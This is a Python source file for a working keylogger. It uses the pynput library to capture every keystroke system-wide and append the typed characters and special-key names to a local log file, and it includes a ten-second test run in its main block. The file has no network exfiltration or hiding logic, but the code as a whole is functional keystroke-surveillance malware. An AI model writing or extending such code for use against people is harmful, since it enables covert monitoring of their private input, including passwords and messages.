import logging
from pynput import keyboard

# Configure logging
logging.basicConfig(filename='logs/keylogger.log', level=logging.DEBUG, format='%(asctime)s: %(message)s')

class Keylogger:
    def __init__(self, log_file="logs/keystrokes.txt"):
        self.log_file = log_file
        self.listener = None

    def on_press(self, key):
        try:
            with open(self.log_file, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:
            with open(self.log_file, "a") as f:
                # Handle special keys (e.g., space, enter)
                if key == keyboard.Key.space:
                    f.write(" ")
                elif key == keyboard.Key.enter:
                    f.write("\n")
                else:
                    f.write(f" [{key.name}] ")

    def start(self):
        if self.listener is None:
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            logging.info("Keylogger started.")

    def stop(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None
            logging.info("Keylogger stopped.")

if __name__ == '__main__':
    # Example usage for testing
    import time
    print("Starting keylogger for 10 seconds...")
    keylogger = Keylogger()
    keylogger.start()
    time.sleep(10)
    keylogger.stop()
    print("Keylogger stopped.")
